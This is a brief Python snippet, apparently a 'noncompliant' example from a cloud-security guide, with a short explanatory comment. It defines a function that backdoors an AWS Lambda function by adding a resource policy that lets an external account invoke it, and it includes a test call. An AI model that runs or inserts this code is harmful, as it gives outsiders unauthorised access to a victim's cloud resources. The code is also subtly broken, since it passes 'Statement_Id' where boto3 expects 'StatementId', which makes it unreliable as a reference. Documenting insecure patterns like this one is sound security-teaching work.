import boto3

def backdoor_lambda_function(function_name, external_account_id):
  lambda_client = boto3.client('lambda')
  response = lambda_client.add_permission(
    FunctionName=function_name,
    Statement_Id='backdoor',
    Action='lambda:InvokeFunction',
    Principal='arn:aws:iam::' + external_account_id + ':root'
  )
  if response['ResponseMetadata']['HTTPStatusCode'] == 201:
    print("Lambda function backdoored successfully.")
  else:
    print("Failed to backdoor Lambda function.")


# Test
backdoor_lambda_function('my-function', '123456789012')


'''
- The noncompliant code uses the AWS SDK’s add_permission method to modify the resource-based policy of the Lambda function.
- It adds a permission statement that allows the specified external AWS account to invoke the function.
'''








